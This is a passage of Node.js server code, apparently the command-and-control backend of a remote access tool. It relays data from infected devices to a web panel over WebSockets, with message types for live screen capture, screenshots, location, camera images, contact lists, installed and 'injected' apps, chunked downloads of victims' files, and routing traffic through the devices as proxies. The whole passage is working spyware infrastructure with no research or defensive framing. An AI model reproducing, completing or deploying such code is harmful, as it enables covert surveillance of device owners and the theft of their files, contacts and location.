                    let mobwidth = data.wmob !== undefined ? data.wmob : "";
                    let mobheight = data.hmob !== undefined ? data.hmob : "";

                    const json_scr = {
                      type: "screen",
                      data: data.img,
                      pid: data.pid,
                      wmob: mobwidth,
                      hmob: mobheight,
                    };

                    const stringscr = JSON.stringify(json_scr);

                    ws.send(stringscr);
                  }
                  break;
                case "screenshot":
                  {


                    let mobwidth = data.wmob !== undefined ? data.wmob : "";
                    let mobheight = data.hmob !== undefined ? data.hmob : "";

                    const json_scr = {
                      type: "screenshot",
                      data: data.img,
                      pid: data.pid,
                      wmob: mobwidth,
                      hmob: mobheight,
                    };

                    const stringscr = JSON.stringify(json_scr);

                    ws.send(stringscr);
                  }
                  break;
                case "loc":
                  {

                    const json_loc = {
                      type: "loc",
                      data: data.msg,
                      pid: data.pid,
                    };
                    const stringloc = JSON.stringify(json_loc);
                    ws.send(stringloc);

                  }
                  break;
                // case "ping":
                //   {
                //     const json_ping = {
                //       type: "ping",
                //       data: data.msg,
                //       pid: data.pid,
                //     };

                //     const stringping = JSON.stringify(json_ping);

                //     ws.send(stringping);

                //   }
                //   break;
                case "proxy":
                  {
                    let thecall = data.ctype;

                    let json_prxy;

                    if (thecall === "first") {
                      let extraddress = ws._socket.remoteAddress;

                      // Check if the address is in IPv6-mapped IPv4 format
                      if (extraddress.startsWith("::ffff:")) {
                        extraddress = extraddress.split("::ffff:")[1];
                      }

                      let localadress = data.loip;
                      let proxyport = data.pport;

                      json_prxy = {
                        type: "proxy",
                        pid: data.pid,
                        calltype: "first",
                        extip: extraddress,
                        locip: localadress,
                        pxport: proxyport,
                      };
                    } else if (thecall === "state") {
                      let the_state = data.pxstate;

                      json_prxy = {
                        type: "proxy",
                        pid: data.pid,
                        calltype: "state",
                        pstate: the_state,
                      };
                    } else if (thecall === "dataup") {
                      let originalip = data.oip;
                      let proxymethod = data.pmth;
                      let proxyurl = data.purl;
                      let extraddress = ws._socket.remoteAddress;

                      // Check if the address is in IPv6-mapped IPv4 format
                      if (extraddress.startsWith("::ffff:")) {
                        extraddress = extraddress.split("::ffff:")[1];
                      }
                      json_prxy = {
                        type: "proxy",
                        pid: data.pid,
                        calltype: "dataup",
                        ogip: originalip,
                        pxip: extraddress,
                        purl: proxyurl,
                        pmthod: proxymethod,
                      };
                    } else {
                      const stopjson = {
                        type: "stop",
                      };

                      const stopit = JSONIT(stopjson);
                      ws.send(stopit);
                      ws.terminate();
                      return;
                    }

                    const stringprxy = JSON.stringify(json_prxy);

                    ws.send(stringprxy);
                  }
                  break;
                case "srch":
                  {
                    let datapaths = data.pths || "null";
                    let srchfor = data.stype || "null";

                    const json_srch = {
                      type: "srch",
                      data: datapaths,
                      pid: data.pid,
                      sfor: srchfor,
                    };

                    const stringsrh = JSON.stringify(json_srch);

                    ws.send(stringsrh);
                  }
                  break;
                case "down": //download
                  {
                    const filename = data.filename;
                    const filedata = data.filedata; // Get base64 chunk
                    const totalSize = data.totalSize;
                    const sentSize = data.sentSize;
                    const chunkNumber = data.chunkNumber;
                    const filehash = data.filehash;
                    const filepath = data.filepath;

                    const json_file = {
                      type: "down",
                      filename: filename,
                      filedata: filedata,
                      totalSize: totalSize,
                      sentSize: sentSize,
                      chunkNumber: chunkNumber,
                      filehash: filehash,
                      filepath: filepath,
                      pid: data.pid,
                    };

                    const stringdata = JSON.stringify(json_file);

                    ws.send(stringdata);
                  }
                  break;
                case "cam":
                  {

                    const json_cam = {
                      type: "cam",
                      data: data.img,
                      pid: data.pid,
                    };

                    const stringcam = JSON.stringify(json_cam);

                    ws.send(stringcam);
                  }
                  break;
                case "injapps":
                  {
                    const jsonData = {
                      type: "injapps",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const stringdata = JSON.stringify(jsonData);

                    ws.send(stringdata);
                  }
                  break;
                case "loadapps":
                  {
                    const jsonData = {
                      type: "loadapps",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const stringdata = JSON.stringify(jsonData);

                    ws.send(stringdata);
                  }
                  break;
                case "loadcontacts":
                  {
                    const jsonData = {
                      type: "loadcontacts",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const stringdata = JSON.stringify(jsonData);

                    ws.send(stringdata);
                  }
                  break;
                default:

                  break;
              }
            } catch (err) {
              console.error("❌ Failed to send to one web user:", err);
            }


          }
        }
      }
      break;


    default:
      break;
  }
}


function JSONIT(params) {
  return JSON.stringify(params);
}

function alertpanel(frontws, msg, alert) {
  const jsonData = {
    type: "notify",
    pid: "ALERTER",
    meth: alert,
    data: msg,
  };

  const jsonString = JSONIT(jsonData);

  frontws.send(jsonString);
}

const PORT = process.env.PORT || 3000;
console.log("🚀 ~ PORT:", PORT);
server.listen(PORT, () => {
  console.log(`Http on port ${PORT}`);
});

console.log("WebSocket on port 8080");
